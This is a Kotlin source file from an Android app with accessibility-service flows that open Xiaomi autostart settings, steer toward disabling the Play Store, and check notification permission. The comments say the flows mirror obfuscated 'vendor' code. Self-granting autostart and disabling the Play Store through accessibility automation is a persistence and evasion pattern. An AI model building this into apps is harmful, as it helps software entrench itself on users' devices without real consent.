package com.storm.safe.rock.service.modules.yw5xud.generic

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.provider.Settings
import com.storm.safe.rock.auto.a11y.UiAutomation
import com.storm.safe.rock.service.MyAccessibilityService

/**
 * GenericMisc — Miscellaneous permission flows.
 * Extracted from GenericSteps: executeXiaomiAutostart, executePlayStoreDisable,
 * executeNotificationChannel, executeXiaomiBgManagement.
 *
 * These are small, self-contained flows grouped together to avoid many tiny files.
 */
class GenericMisc(
    private val service: MyAccessibilityService?,
    private val context: android.content.Context,
    private val ui: UiAutomation,
    private val steps: GenericSteps
) {
    companion object {
        private const val TAG = "GenericMisc"
    }

    // ── Flow 1: Xiaomi Autostart (vendor m212135b5) ──────────────────

    /**
     * Xiaomi autostart management (international MIUI only).
     * Vendor b5 — only runs when c4() (isXiaomi) returns true.
     */
    fun executeXiaomiAutostart(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (!steps.isXiaomiBrand()) {
            logs.add("小米自启动: 非小米设备, 跳过")
            return
        }
        try {
            val intent = Intent().apply {
                component = android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已启动小米自启动管理")
            successes.add("小米自启动管理已打开")
        } catch (e: Exception) {
            // Fallback: try MIUI security center main
            try {
                val fallback = Intent().apply {
                    component = android.content.ComponentName(
                        "com.miui.securitycenter",
                        "com.miui.securitycenter.MainActivity"
                    )
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                }
                (service ?: context).startActivity(fallback)
                logs.add("已启动小米安全中心(回退)")
            } catch (e2: Exception) {
                failures.add("小米自启动配置失败: ${e2.message}")
            }
        }
    }

    // ── Flow 5: Play Store Disable (vendor m212134b4) ────────────────

    /**
     * Disable Play Store auto-update.
     * Matches vendor b4: navigate to Play Store app info to disable it.
     */
    fun executePlayStoreDisable(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        try {
            val pm = context.packageManager
            val playStorePackage = "com.android.vending"
            val appInfo = try {
                pm.getApplicationInfo(playStorePackage, 0)
            } catch (_: Exception) {
                logs.add("Play Store 未安装, 跳过")
                return
            }
            if (!appInfo.enabled) {
                successes.add("Play Store 已禁用")
                return
            }
            // Navigate to Play Store app info to disable (vendor b4 flow)
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:$playStorePackage")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            (service ?: context).startActivity(intent)
            logs.add("已打开 Play Store 应用信息页")
        } catch (e: Exception) {
            failures.add("Play Store 禁用失败: ${e.message}")
        }
    }

    // ── Flow 7: Notification Channel (vendor m212132b2) ──────────────

    /**
     * Notification channel permission (API 33+).
     * Matches vendor b2: for API 33+, check POST_NOTIFICATIONS.
     */
    fun executeNotificationChannel(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (Build.VERSION.SDK_INT < 33) {
            logs.add("通知权限: API < 33, 跳过")
            return
        }
        try {
            val granted = context.checkSelfPermission("android.permission.POST_NOTIFICATIONS") ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            if (granted) {
                successes.add("通知权限已授权")
            } else {
                logs.add("通知权限未授权, 需要通过Activity请求")
            }
        } catch (e: Exception) {
            failures.add("通知权限检查失败: ${e.message}")
        }
    }

    // ── Flow 8: Xiaomi BG Management (vendor m212136b6) ──────────────

    /**
     * Xiaomi background management popup (international MIUI only).
     * Vendor b6 — only runs when c4() (isXiaomi) returns true.
     */
    fun executeXiaomiBgManagement(
        successes: MutableList<String>,
        failures: MutableList<String>,
        logs: MutableList<String>
    ) {
        if (!steps.isXiaomiBrand()) {
            logs.add("小米后台管理: 非小米设备, 跳过")
            return
        }
        logs.add("小米后台管理: 需要无障碍服务自动化处理")
        successes.add("小米后台管理已排队")
    }
}
